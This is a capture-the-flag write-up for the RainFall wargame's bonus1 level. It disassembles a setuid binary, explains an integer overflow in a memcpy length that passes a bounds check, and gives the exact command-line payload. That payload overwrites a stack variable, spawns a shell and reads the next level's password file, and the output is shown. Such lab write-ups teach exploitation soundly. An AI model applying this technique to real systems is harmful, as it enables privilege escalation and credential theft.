# Source Code

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
<pre><code class="language-asm">

Dump of assembler code for function main:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     and    esp,0xfffffff0
   0x0804842a <+6>:     sub    esp,0x40
   0x0804842d <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:    add    eax,0x4
   0x08048433 <+15>:    mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:    mov    DWORD PTR [esp],eax
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    eax,0x1
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:    add    eax,0x8
   0x08048460 <+60>:    mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:    mov    edx,eax
   0x08048464 <+64>:    lea    eax,[esp+0x14]
   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    eax,0x0
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
</code></pre>
</td>
<td>
<pre><code class="language-c">
int main()
{
  char dest[40];
  int n;

  n = atoi(argv[1]);
  if ( n > 9 )
    return 1;
  memcpy(dest, argv[2], 4 * n);
  if ( n == 1464814662 )
    execl("/bin/sh", "sh", 0);
  return 0;
}
</code></pre>
</td>
</tr>
</table>



# Exploring

### Overview


The code provided has a buffer overflow if and only if the condition of `n > 9` passed.

The `n` variable that shall be overridden comes after `dest` buffer with 40 byte of len.

So to affect the `n`, `memcpy` shall copy **40** of padding + **4** bytes for target value (`n` it self), in total is 44.

From above the `n` (first arg) must have `11` as integer.

We can't do that a cause this condition `if (n > 9) return 1;`.

This condition return from the function if only greatter than `**9**.

This instruction seems intersting `4 * n`,

Yes, this is the vulnerability, the integer overflow.


### Strategie

Our goal is find a negative integer be **11** after an overflowing due `4 * negative-number`.

the multiplication by **4** is usually shifting left by **2**.

e.g: 3 * 4 -> 3 << 2

```
        3        *          4                12
00000000000000000000000000000011 * 00000000000000000000000000000100 = 00000000000000000000000000001100

00000000000000000000000000000011 << 1 = 00000000000000000000000000000110
00000000000000000000000000000011 << 2 = 00000000000000000000000000001100 = 12
```

We have to find negative number after shift by 2 become 44.

We start by **44** (**00000000000000000000000000101100**) bit representation and shift it right by **2**:

```
00000000000000000000000000101100 >> 2 = 00000000000000000000000000001011
```

Now add the bit sign (**1** on the most left):

```
   10000000000000000000000000001011 = -2147483637
   ^
0 becode 1
```

# Exploitation

The value shall ovverride **n** is **1464814662** (**0x574f4c46** -> little-endian **\x46\x4c\x4f\x57**)

So the first argument to the program is `-2147483637`,

and the second is:

```
'a' * 40 + '\x46\x4c\x4f\x57'
```

Output:

```
bonus1@RainFall:~$ ./bonus1 '-2147483637' `printf 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x46\x4c\x4f\x57'`
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

See you on the next one.
